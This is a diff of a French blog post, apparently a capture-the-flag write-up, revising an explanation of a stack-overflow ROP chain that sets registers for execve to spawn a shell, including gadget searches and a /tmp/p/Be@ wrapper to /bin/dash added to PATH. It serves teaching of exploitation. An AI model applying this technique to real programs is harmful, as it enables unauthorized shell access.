@@ -205,19 +205,21 @@ $ export PATH=$PATH:/tmp/p
 
 &lt;p&gt;On va tenter de faire exécuter un &lt;code&gt;execve()&lt;/code&gt; via des gadgets, du coup.  Ce qu&amp;rsquo;on souhaite, c&amp;rsquo;est faire executer &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, NULL, NULL);&lt;/code&gt;.  Notons que d&amp;rsquo;après la documentation de l&amp;rsquo;ABI du système, &lt;code&gt;$rax&lt;/code&gt; doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit&amp;hellip; dans notre cas on s&amp;rsquo;en moque, puisqu&amp;rsquo;on veut spawner un shell).  Il faudra donc mettre les registres dans l&amp;rsquo;état suivant:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt; RAX &amp;lt;- 59 (la valeur du syscall execve() sur 64bits, avant int 0x80)
+&lt;pre&gt;&lt;code&gt; RAX &amp;lt;- 0x3b (= 59, la valeur du syscall execve() sur 64bits)
  RDI &amp;lt;- &amp;quot;/bin/sh&amp;quot; ou quelque chose du genre
- RSX &amp;lt;- 0 (NULL)
- RDX &amp;lt;- 0 (NULL)
+ RSI &amp;lt;- 0x00 (NULL)
+ RDX &amp;lt;- 0x00 (NULL)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Donc, le layout de la pile devrait ressembler à quelque chose comme ceci:&lt;/p&gt;
+&lt;p&gt;Donc, le layout de la pile en sortie de &lt;code&gt;main()&lt;/code&gt; devrait ressembler à quelque chose comme ceci:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;[AAA....A] [BBBBBB00] [pop rax] [valeur à mettre dans rax] [pop rdi] [valeur à mettre dans rdi]... [appel à execve()]
-^      ^          ^
-|      |          |
-buffer     $rbp       $rip
+&lt;pre&gt;&lt;code&gt;[ AAA....AAAA | BBBBBB00 | @(pop rax; ret) | 0x3b | @(pop rdi; ret) | &amp;quot;/bin/sh&amp;quot; | @(pop rsi; ret) | 0x0  | @(pop rdx; ret) | 0x0 | @syscall ]
+     ^                         ^
+     |                         |
+     buffer                    $rip écrasé par cette adresse
 &lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Une fois arrivé à la fin de la fonction &lt;code&gt;main()&lt;/code&gt;, le système va donc exécuter les instructions dont l&amp;rsquo;adresse est stockée en &lt;code&gt;$rip&lt;/code&gt;, à savoir &lt;code&gt;pop rax; ret&lt;/code&gt;.  Quand cette suite d&amp;rsquo;instructions est en cours d&amp;rsquo;exécution, le haut de la pile devient alors le mot de 8 octets suivant (&lt;code&gt;0x0000003b&lt;/code&gt;), et c&amp;rsquo;est ce mot qui est &lt;code&gt;pop&lt;/code&gt;-é pour être mis dans &lt;code&gt;$rax&lt;/code&gt;.  On exécutera alors le &lt;code&gt;pop rdi; ret&lt;/code&gt;, qui prendra la valeur sur la pile à ce moment, à savoir l&amp;rsquo;adresse de la chaîne de caractères &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; pour la stocker dans &lt;code&gt;$rdi&lt;/code&gt;.  Et ainsi de suite.&lt;/p&gt;
 
 &lt;p&gt;On va utiliser l&amp;rsquo;outil téléchargé (il y en a d&amp;rsquo;autres, comme &lt;code&gt;ROPgadget&lt;/code&gt;), pour avoir les adresses des instructions intéressantes:&lt;/p&gt;
 
@@ -247,7 +249,13 @@ $ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
 
 &lt;p&gt;Bien, on a l&amp;rsquo;adresse a empiler en dernier!&lt;/p&gt;
 
-&lt;p&gt;Maintenant, si vous avez fait attention, vous avez remarqué qu&amp;rsquo;on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().  On ne trouve pas &amp;ldquo;/bin/sh&amp;rdquo; dans l&amp;rsquo;image du programme en mémoire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qu&amp;rsquo;on ajoutera au &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Maintenant, si vous avez fait attention, vous avez remarqué qu&amp;rsquo;on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nm -a ./ch34 | grep &amp;quot;/bin/sh&amp;quot;
+    $
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On ne trouve pas &amp;ldquo;/bin/sh&amp;rdquo; dans le binaire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à &lt;code&gt;/bin/dash&lt;/code&gt; qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire &lt;code&gt;/tmp/p&lt;/code&gt;, qu&amp;rsquo;on ajoutera au &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;$ readelf -x .rodata ./prog | less
 [...]
@@ -255,7 +263,7 @@ $ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
 [...]
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;On trouve la séquence &lt;code&gt;42654000&lt;/code&gt;, qui correspond à &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; terminée par un nul-byte.  Son adresse est &lt;code&gt;0x00493c00&lt;/code&gt;, et on l&amp;rsquo;utilisera dans &lt;code&gt;$rdi&lt;/code&gt;.  Ensuite, on crée un petit shell script dans &lt;code&gt;/tmp/p&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;On trouve la séquence &lt;code&gt;42654000&lt;/code&gt;, qui correspond à &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; en ASCII, terminée par un nul-byte.  Son adresse est &lt;code&gt;0x00493c00&lt;/code&gt;, et on l&amp;rsquo;utilisera dans &lt;code&gt;$rdi&lt;/code&gt;.  Ensuite, on crée un petit shell script dans &lt;code&gt;/tmp/p&lt;/code&gt;:&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /tmp/p/Be@
 #!/bin/dash
@@ -264,7 +272,7 @@ $ rp-lin-x64 -f prog --unique  -r 1 | egrep &amp;quot;pop rdx&amp;quot;
 $ chmod +x /tmp/p/Be@
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Ainsi, si &lt;code&gt;execve()&lt;/code&gt; invoque la commande &lt;code&gt;Be@&lt;/code&gt;, elle sera dans notre &lt;code&gt;PATH&lt;/code&gt;, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d&amp;rsquo;un path type &lt;code&gt;/bin/sh&lt;/code&gt; via des gadgets.&lt;/p&gt;
+&lt;p&gt;Ainsi, si &lt;code&gt;execve()&lt;/code&gt; invoque la commande &lt;code&gt;Be@&lt;/code&gt;, elle sera dans notre &lt;code&gt;PATH&lt;/code&gt;, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d&amp;rsquo;un path type &lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; via des gadgets.&lt;/p&gt;
 
 &lt;p&gt;Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l&amp;rsquo;endianness:&lt;/p&gt;
 
